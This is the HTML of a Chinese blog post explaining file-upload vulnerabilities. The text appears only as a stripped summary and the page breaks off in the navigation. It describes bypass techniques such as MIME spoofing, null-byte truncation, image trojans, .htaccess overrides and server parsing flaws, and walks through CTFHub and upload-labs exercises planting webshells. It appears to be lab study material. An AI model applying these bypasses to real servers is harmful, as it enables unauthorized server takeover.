<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>文件上传 | MooSe的小窝</title><meta name="author" content="MooSe"><meta name="copyright" content="MooSe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#18171d"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="文件上传"><meta name="application-name" content="文件上传"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#18171d"><meta property="og:type" content="article"><meta property="og:title" content="文件上传"><meta property="og:url" content="http://example.com/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.html"><meta property="og:site_name" content="MooSe的小窝"><meta property="og:description" content="知识点首先来介绍一下文件上传漏洞及其原理吧 简介1、文件上传漏洞简介文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。  这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。 这种攻击方式是最为直接和有"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/MooSeQAQ/tuchuang@main/img/moose.jpg"><meta property="article:author" content="MooSe"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/MooSeQAQ/tuchuang@main/img/moose.jpg"><meta name="description" content="知识点首先来介绍一下文件上传漏洞及其原理吧 简介1、文件上传漏洞简介文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。  这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。 这种攻击方式是最为直接和有"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://example.com/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  linkPageTop: {"enable":"ture","title":"与数百名博主无限进步","addFriendPlaceholder":"昵称（请勿包含博客等字样）：\n网站地址（要求博客地址，请勿提交个人主页）：\n头像图片url（请提供尽可能清晰的图片，我会上传到我自己的图床）：\n描述：\n站点截图（可选）：\n"},
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: undefined,
  greetingBox: undefined,
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: {"mode":"api","api":"https://img2color-go.vercel.app/api?img=","cover_change":true},
  authorStatus: {"skills":["🤖️ 数码科技爱好者","🔍 分享与热心帮助","🏃 脚踏实地行动派","🧱 团队小组发动机"]},
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    simplehomepage: false,
    post: true
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: MooSe","link":"链接: ","source":"来源: MooSe的小窝","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: {"enable":"ture","delay":100,"shiftDelay":200},
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'MooSe的小窝',
  title: '文件上传',
  postAI: '',
  pageFillDescription: '知识点, 简介, 1、文件上传漏洞简介, 2、文件上传漏洞原理：, 3、文件上传漏洞的高危触发点, 前端检测, 1.原理：, 2.判断：, 3.绕过方法：, 3.1 删除js绕过：, 3.2  burpsuite抓包, 后端检测, 一.后缀名检测漏洞：, 1.黑名单, 1.1原理：, 1.2 绕过方法：, 1.2.1解析漏洞, 1.2.2截断上传, 1.2.3大小写绕过, 1.2.4黑名单扩展名的漏网之鱼, 1.2.5利用Windows的命名机制, 1.2.6双写绕过, 2.白名单, 2.1原理：, 2.2绕过方法：, 2.2.1解析漏洞, 2.2.2截断上传, 二.MIME检测：, 1.什么是MIME：, 2. 常见的MIME类型, 3. 检测方式：, 4. MIME绕过的原理：, 三.00截断：, 1.原理：, 2.绕过思路：, 四.文件头检测漏洞：, 1.原理：, 2.常见的文件头：, 3.操作, 五.内容检测图片马绕过：, 1.漏洞原理：, 2.图片马制作：(重点), 3.解析图片马：, 解析漏洞, 一..htaccess文件解析漏洞：, 1.漏洞利用前提：, 2.原理：, 3 利用方式, 4 .htaccess文件内容, 二.Apache解析漏洞：, 1 漏洞原理：, 2 影响版本：, 3.IIS6.096解析漏洞：, 三.IIS7.0 | IIS7.5 | Nginx的解析漏洞：, 1.原理：, 2.漏洞形式：, 四.另外两种解析漏洞：, 条件竞争漏洞, 二次渲染漏洞, 1.二次渲染原理：, 2.绕过：, 3.判断, 靶场, CTFHub, 无验证, 前端验证, MINI验证, .htaccess, 双写绕过, *00截断, **文件头检查, Upload-labs, Pass-01, Pass-02, Pass-03, Pass-04, .hatccess, 分号配合iis解析漏洞, 冒号配合PHP和Windows环境的叠加特性, Pass-05, Pass-06, 文件被重命名的情况下连接蚁剑, Pass-07, Pass-08, Pass-09, Pass-10, Pass-11, Pass-12, Pass-13, Pass-14, Pass-15知识点首先来介绍一下文件上传漏洞及其原理吧简介文件上传漏洞简介文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件这里上传的文件可以是木马病毒恶意脚本或者等这种攻击方式是最为直接和有效的文件上传本身没有问题有问题的是文件上传后服务器怎么处理解释文件如果服务器的处理逻辑做的不够安全则会导致严重的后果文件上传漏洞本身就是一个危害巨大的漏洞更是将这种漏洞的利用无限扩大大多数的上传漏洞被利用后攻击者都会留下以方便后续进入系统文件上传漏洞原理在文件上传的功能处若服务端脚本语言未对上传的文件进行严格验证和过滤导致恶意用户上传恶意的脚本文件时就有可能获取执行服务端命令的能力这就是文件上传漏洞文件上传漏洞对应用来说是一种非常严重的漏洞一般情况下应用都会允许用户上传一些文件如头像附件等信息如果应用没有对用户上传的文件进行有效的检查过滤那么恶意用户就会上传一句话木马等从而达到控制网站的目的文件上传漏洞的高危触发点存在文件上传功能的地方都有可能存在文件上传漏洞比如相册头像上传视频照片分享论坛发帖和邮箱等可以上传附件的地方也是上传漏阔的高危地带另外像文件管理器这样的功能也有可能被攻击者所利用值得注意的是如果移动端也存在类似的操作的话那么相同的原理也存在文件上传漏洞的风险前端检测主要是通过代码进行检测非常容易进行绕过原理应用系统虽然对用户上传的文件进行了校验但是校验是通过前端代码完成的由于恶意用户可以对前端进行修改或者是通过抓包软件篡改上传的文件就会导致基于的校验很容易被绕过判断如何判断当前页面使用前端的验证方式前端验证通过以后表单成功提交后会通过浏览器发出条网络请求如果前端验证不成功则不会发出这项网络请求可以在浏览器的网络元素中查看是否发出了网络请求绕过方法删除或者禁用火狐浏览器使用代理上传文件上传符合要求的文件类型抓包修改文件类型删除绕过直接删除代码中事件中关于文件上传时验证上传文件的相关代码即可例如这个例子或者可以不加载所有还可以将源码一份到本地然后对相应代码进行修改本地提交即可抓包直接用拦截发送到后将文件头类型修改或者修改类型即可后端检测一后缀名检测漏洞大致原理通常是针对文件的扩展名后缀进行检测主要是通过黑白名单进行过滤检测黑名单如果不符全过滤规则则不允许上传白名单只允许符合规定后缀名的文件上传黑名单原理黑名单检测一般有个专门的文件里面会包含常见的危险脚本文件例如或之前版本的黑名单绕过方法解析漏洞文件解析漏洞解析漏洞的解析漏洞解析漏洞截断上传截断类型截断截断原理由于代表结束符所以会把后面的所有字符都截断截断条件版本小于的为状态大小写绕过比如和之类黑名单扩展名的漏网之鱼比如和之类利用的命名机制空格在中后缀名后面的点和空格都会被删除掉双写绕过有时候在检测时后台会把敏感字符替换成空格这个时候我们可以使用双写进行绕过比如白名单原理白名单检测一般有个专门的文件里面会包含的正常文件绕过方法解析漏洞文件解析漏洞解析漏洞的解析漏洞解析漏洞截断上传截断类型截断截断原理由于代表结束符所以会把后面的所有字符都截断截断条件版本小于的为状态二检测什么是多用途互联网邮件扩展类型是设定某种扩展名的文件用一种应用程序来打开的方式类型当该扩展名文件被访问的时候浏览器会自动使用指定应用程序来打开绕过上传限制服务端绕过检测常见的类型纯文本文档代码文档图像图像图像动画二进制数据文档检测方式在文件上传过程中服务端会针对我们的上传的文件生成一个数组这个数组其中有一项就是这个文件的类型服务端对文件进行检测时就是通过检测脚本中的黑白名单和这个数组中的进行对比如果符合要求就允许上传这个文件绕过的原理部分应用系统判定文件类型是通过字段黑客可以通过抓包将字段改为常见的图片类型如改成从而绕过校验三截断原理虽然应用做了校验但是由于文件上传后的路径用户可以控制攻击者可以利用手动添加字符串标识符的方式来将后面的拼接的内容进行截断导致后面的内容无效并且后面的内容又可以帮助我们绕过黑白名单的检测绕过思路在语言中空字符有一个特殊含义代表字符串的拼接结束这里我们使用的是语言属于高级语言底层靠语言来实现的也就是说空字符的字符串拼接结束功能在中也能实现但是我们在中不能直接使用空这样会造成无法识别我们通过查看对照表发现对照表第一个就空字符它对应的进制是这里我们就可以用进制的来代替空字符让它截断后面的内容使用进行抓包因为这里是通过进行传递的文件上传后存储路径所以需要对进制的进行编码编码的结果就是通过这种方式就可以截断后面的内容让拼接的文件名不再进行生效四文件头检测漏洞原理在每一个文件包括图片视频或其他的非文件的开头十六进制表示实际上都有一片区域来显示这个文件的实际用法这就是文件头标志我们可以通过进制编辑器打开文件添加服务器允许的文件头以绕过检测常见的文件头注意下面的文件头的格式是进制的格式操作在进行文件头绕过时我们可以把上面的文件头添加到我们的一句话木马内容最前面达到绕过文件头检测的目的五内容检测图片马绕过漏洞原理一般文件内容验证使用函数检测会判断文件是否是一个有效的文件图片如果是则允许上传否则的话不允许上传本实验就是将一句话木马插入到一个合法的图片文件当中然后用管理工具进行远程连接图片马制作重点准备一张图片这里为一个一句话木马记为通过以下命令合成一个图片马命令如下指定以二进制格式复制合并文件用于图像或者声音类文件指定以格式复制合并文件用于等文本类文件这样子就可以复制从而制作出图片木马了注这条命令的意思是通过命令把图片文件以二进制文件形式添加到文件中以文本文件形式输出为文件解析图片马一般解析图片马需要结合解析漏洞或者文件包含才能解析图片马解析漏洞一文件解析漏洞漏洞利用前提具体应用没有禁止文件的上传同时服务器提供商允许用户上传自定义的文件原理文件或者分布式配置文件全称是超文本入口提供了针对目录改变配置的方法也就是在一个特定的文档目录中放置一个包含一个或多个指令的文件以作用于此目录及其所有子目录作为用户所能使用的命令受到限制管理员可以通过的指令来设置利用方式上传覆盖文件重写解析规则将上传的带有脚本马的图片以脚本方式解析文件内容文件解析规则的增加是可以按照组合的方式去做的不过具体得自己多测试解释在当前目录下如果匹配到文件则被解析成代码执行在当前目录下如果匹配到文件则被解析成代码执行二解析漏洞漏洞原理解析文件的规则是从右到左开始判断解析如果后缀名为不可识别文件解析就再往左判断比如的和这两种后缀是不可识别解析就会把解析成影响版本解析漏洞解析漏洞分两种目录解析以命名的文件夹里的文件都将会被当成文件执行文件解析像这种畸形文件名在后面的直接被忽略也就是说当成文件执行默认的可执行文件除了还包含这三种三的解析漏洞原理拿到文件路径更专业的说法是后一看后缀是便认为该文件是文件转交给去处理一看不存在便删去最后的又看存在便把当成要执行的文件了又因为后缀为认为这不是文件于是返回这其中涉及到的一个选项该值默认为表示开启开启这一选项可以对文件路径进行修理举个例子当遇到文件路径时若不存在则会去掉最后的然后判断是否存在若存在则把当做文件若仍不存在则继续去掉以此类推漏洞形式四另外两种解析漏洞条件竞争漏洞条件竞争漏洞是一种服务器端的漏洞由于服务器端在处理不同用户的请求时是并发进行的因此如果并发处理不当或相关操作逻辑顺序设计的不合理时将会导致此类问题的发生上传文件源代码里没有校验上传的文件文件直接上传上传成功后才进行判断如果文件格式符合要求则重命名如果文件格式不符合要求将文件删除由于服务器并发处理同时多个请求假如用户上传了木马文件由于代码执行需要时间在此过程中用户访问了用户上传的文件会有以下三种情况访问时间点在上传成功之前没有此文件访问时间点在刚上传成功但还没有进行判断该文件存在访问时间点在判断之后文件被删除没有此文件二次渲染漏洞二次渲染原理在我们上传文件后网站会对图片进行二次处理格式尺寸要求等服务器会把里面的内容进行替换更新处理完成后根据我们原有的图片生成一个新的图片并放到网站对应的标签进行显示绕过配合文件包含漏洞将一句话木马插入到网站二次处理后的图片中也就是把一句话插入图片在二次渲染后会保留的那部分数据里确保不会在二次处理时删除掉这样二次渲染后的图片中就存在了一句话在配合文件包含漏洞获取可以配合条件竞争这里二次渲染的逻辑存在漏洞先将文件上传之后再判断符合就保存不符合删除可利用条件竞争来进行爆破上传判断如何判断图片是否进行了二次处理对比要上传图片与上传后的图片大小使用进制编辑器打开图片查看上传后保留了哪些数据查看那些数据被改变靶场上面的题不多也不难很适合基础入门无验证首先这是作为一道入门题没有任何的过滤和验证那我们就来练习一下蚁剑的使用以及一句话木马的制作吧注意这个木马很可能会被电脑本身的防火墙给拦截下面我们将一个木马文件上传因为没有任何验证所以可以直接提交将文件的相对路径复制到后面记得加个然后用蚁剑打开进入服务器可以看到我们刚才添加的文件说明文件上传成功了返回上一级就可以找到啦前端验证首先我们打开一个文件并尝试上传发现不能上传查看源代码可以知道这是因为存在白名单验证只有的文件才能通过验证我们可以通过抓包上传一个格式的文件这个本质其实是是木马文件修改后缀名而成并在中改回它的后缀名即也就是将其还原注意这里的顺序只要将文件名的后缀修改即可发送请求后发现文件成功上传了将刚刚上传的文件的相对路径复制到后面打开蚁剑复制测试连接连接通过说明上传成功且能通过蚁剑来访问可以看到这里是我们刚刚上传的文件其中包括一个用来抓包的文件的修改后还原的文件同样的在目录中寻找的位置这样子就可以获取了验证进入靶场用一个文件上传看看显然验证不通过于是采用抓包的方式先上传一个文件通过进行抓包可以看到这里的类型已经是类型的了因为我们上传的文件虽然内容是但是格式或者说后缀名是类型的既然也就是类型符合那么只要改回文件的后缀名就可以将其还原成木马了点击发送可以看到文件已经上传成功并回显了文件的相对路径将相对路径复制到原来网页的后面打开蚁剑尝试连接这样就进入它的服务端了并且可以看到我们刚刚上传的文件同理找到下的这道题是通过上传文件达到绕过的目的我们先扔一个文件试试嗯显然上传不了因为文件类型被限制验证不通过那么我们上传一个正经的文件看看欸发现可以上传于是我们就利用文件的特性上传一个类型的木马会在服务器将这个以的形式解析从而达到绕过的效果当然了首先我们得先上传一个过去放到它的下载路径里面嗯成功上传文件这边给一下文件的内容这段代码的意思就是将类型的文件以的形式解析下面就可以上传我们的木马了虽然是类型对了如果没有文件这里我们也是可以把这个类型的小木马上传的但是这样子上传过去的木马是不能正常使用的充其量也只是一个没有啥内容的图片好的上传成功将文件的相对路径过去复制域名用蚁剑打开发现连接成功说明木马能正常使用打开文件列表我们可以看到我们上传的仍然是一个类型文件只是会将它以的形式解码相当于发挥了原有的木马性能可以试一下如果把这个文件删除那么这个类型的木马就使用不了了可见会报错因为识别不到能用的木马程序好了拿下双写绕过首先上传一个类型的木马并用抓包我们先来尝试一下修改文件后缀类型改为类型发现上传过去的文件失去了后缀说明该题对进行了滤过尝试用双写后缀进行绕过注意双写不是随便双写就可以的噢发现上传的文件成功还原成了类型复制相对地址连接蚁剑可以看到这里有三个文件第二个是用于抓包时上传过去的类型的木马第一个是尝试修改后缀名为时上传的文件可以看到这个文件的被滤过了否则上传的应该是第三个文件则是通过双写绕过上传的文件原本上传的最后在目录中找到截断了解一下截断原理代表结束符所以会把后面的所有字符都截断用就可以实现文件的正常执行上传一个类型的木马并抓包可以看到抓包后页面如下那么我们需要怎么做呢只需在请求中加上文件名这样子就上传过去的就是类型的文件了访问一下试试连接成功可以看到我们上传过去的变成了这是因为对后面的内容就进行了拦截就只剩下前面的了获得文件头检查所谓文件头检查就是检查图片文件的头部中特有的信息我们可以在木马前加入一行代表图片的文件头信息或者上传一个图片然后在图片里植入木马这里我用第二种方法进行演示首先呢我们需要制作一个最简单的图片真正的正经图片木马用电脑自带的画图工具画一下然后保存成格式就可以了接下来上传这个图片并用抓包如下拦截下来这些都是图片的编码我们找到图片文件的最后一段第一步在这个地方加上一句话木马回不回车都行第二步将后缀名改为修改如下点击发送发现文件成功上传复制相对路径连接蚁剑成功连接在这边可以看到我们上传的文件找到所在路径获取进入靶场注意到右上角可以查看源代码看一下源码简单的前端校验绕过把一个一句话木马后缀名先改成进行抓包将后缀名改回可以看到现在文件可以成功上传了尝试连接蚁剑成功连接添加数据如果文件上传上传之后找不到文件路径怎么办我们可以在原页面查看源代码在源代码中搜索我们上传的文件即可得到文件路径查看源代码可以看到为类型用同样的方法即可先抓包注意到这里的类型以及是格式因此识别通过可以绕过验证把后缀名改回即可解析连接蚁剑成功添加查看源代码删除文件名末尾的点转换为小写去除字符串收尾去空上传出错不允许上传后缀文件文件夹不存在请手工创建定义变量是一个布尔变量用于表示文件是否成功上传默认为是一个字符串变量用于存储上传过程中的消息默认为检查是否提交了表单使用函数检查是否存在名为的参数以确定是否提交了表单检查上传路径是否存在使用函数检查上传路径是否存在其中是一个常量表示上传文件的目标路径如果上传路径不存在则将错误消息存储在变量中检查文件后缀名定义了一个名为的数组包含不允许上传的文件后缀名获取上传文件的原始文件名并使用函数去除文件名末尾的空格使用函数获取文件名中的后缀名包括点使用函数将后缀名转换为小写使用函数去除后缀名中的字符串如果存在使用函数去除后缀名首尾的空格并将结果存储在变量中检查文件后缀名是否允许上传使用函数检查是否存在于数组中如果不在数组中则继续执行下面的代码处理上传文件获取上传文件的临时文件路径存储在变量中构造目标文件的路径包括上传路径当前日期时间和一个随机数并将后缀名添加到文件名中存储在变量中使用函数将临时文件移动到目标路径如果移动文件成功则将设置为表示文件成功上传如果移动文件失败则将错误消息存储在变量中处理不允许上传的文件后缀名如果存在于数组中则将错误消息存储在变量中处理上传路径不存在的情况如果上传路径不存在则将错误消息存储在变量中提醒用户手动创建上传路径可见为简单的黑名单过滤我们抓包后将后缀名改为绕过由于被列为黑名单于是改为成功上传尝试连接蚁剑报错回看源代码文件路径被重新命名我们可以在网页源代码中找到重命名后的文件路径先来看一下源代码删除文件名末尾的点转换为小写去除字符串收尾去空上传出错此文件不允许上传文件夹不存在请手工创建典型的黑名单绕过下面采用多种方式来绕过这一题只要黑名单中没有将的后缀名过滤掉就能使用这种文件进行攻击原理其实就是通过上传恶意构造的文件从而修改的配置使得在解析特定后缀名的文件时会当成其他后缀文件类型来解析这种文件是的一种配置文件包含三行代码注记第一行内留空表示上传给任意的文件类型都如下操作当成文件来解析至这是第二行的效果不过其实只写这样一行就可以了意思是把文件当成文件解析下面我们来具体操作一下先上传一个为后缀的一句话木马这个时候木马显然是不能被执行的我们只需要再上传一个文件相当于修改了的配置现在我们来试着连接蚁剑可以看到神奇的事情发生了虽然后缀名仍是但可以执行木马服务端查看我们上传的文件后缀名仍是只是我们通过上传文件修改了的配置使得文件被当成文件来解析分号配合解析漏洞另一种方法是通过分号来命名文件可以达到绕过的效果这其实是上的服务的解析漏洞使用前提是要开启服务端冒号配合和环境的叠加特性还有一种方法就是利用和环境的叠加特性在直接修改文件名称加上冒号肯定是行不通的所以我们先以后缀上传一句话木马抓包修改文件名称加上冒号即可原理就是环境会将冒号后面的内容去除可以绕过验证而则会去除后面部分只留下这样就能执行木马了首先我们查看源代码很明显地注意到没有改为小写的函数于是采用大小写绕过的方式这次用的内嵌浏览器上传一个后缀的一句话木马抓包后将后缀改为可以看到这样文件就能成功上传了那么问题来了这道题有文件重命名的函数那么怎么通过蚁剑来连接呢文件被重命名的情况下连接蚁剑其实我们只需要在上传了文件的那个网页查看源代码就好了那么怎么打开那个网页呢原网页上传的是抓包前的文件我们可以用来显示那个网页然后把得到的复制到内嵌浏览器中再打开网页查看源代码即可用此地址便可连接蚁剑先查看源代码注意到没有过滤掉像前几题就有这样的黑名单过滤少了去除字符串这句话我们就可以采用文件流特性来绕过只需抓包后将上传的改为这样上传后保存的文件其实是不过前提是基于系统系统就不行了分析源代码首先可以看到这里有一个替换函数将黑名单内的字符串替换成内的在本题是替换成了空第二点是黑名单里都没有了这种情况才能使用双写绕过既然是替换成空那么就可以操作一下了采用双写绕过即可先抓包修改后缀名为注不行噢可以看到文件成功上传再打开上传页面寻找保存路径从网页源代码中找到路径可以看到上传保存的文件后缀名已经是了尝试连接蚁剑成功连接分析源代码典型的白名单例题抓包后查看请求包在请求头位置经典的绕过原理在编码中代表总结截断适用于处编码分析源代码也是一道白名单类型的题抓包一下可以注意到与上一题相比在请求数据中而不是在处由于文件路径不在处因此不能使用绕过了既然如此我们就可以使用绕过适用于文件路径在请求数据中的情况第一步现在后加上我们要命名的文件名然后加上一个空格这时我们虽然敲的是空格但其实是十进制的而事实上我们需要的是十六进制的于是还需要在中改成十六进制的注这个空格的作用只是便于我们在中找到空格对应的十六进制编码的位置而已改成其他有辨识度的字符其实也可以由于空格在十六进制中表示为寻找一下发现所在位置然后我们将其改为也就是十六进制的这样请求数据中的空格就变成十六进制的了小结适用于在请求数据中的情况',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-07-08 14:38:27',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://cdn.jsdelivr.net/gh/MooSeQAQ/tuchuang@main/img/studyinging.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">MooSe的小窝</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 留言板</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 随便逛逛</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a 